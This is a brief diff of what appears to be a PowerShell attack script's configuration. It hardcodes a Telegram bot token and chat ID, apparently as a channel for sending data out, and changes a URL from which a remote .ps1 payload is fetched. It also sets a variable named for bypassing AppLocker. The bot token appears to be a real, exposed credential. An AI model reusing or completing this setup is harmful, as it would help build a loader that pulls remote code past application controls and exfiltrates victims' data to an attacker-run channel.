@@ -21,7 +21,7 @@ BOT TELEGRAM:
 
 $BotToken = "5666049912:AAHZth6IPRFSKVjx-6sYNLtR4hEOo92tqhA"
 $ChatID = '-1001799282824'
-$githubScript = 'https://raw.githubusercontent.com/alexfranpsv1.ps1'
+$githubScript = 'https://raw.githubusercontent.com/mishustick123/1/main/psv1.ps1'
 $pathbypassapplocker = ""
 
 
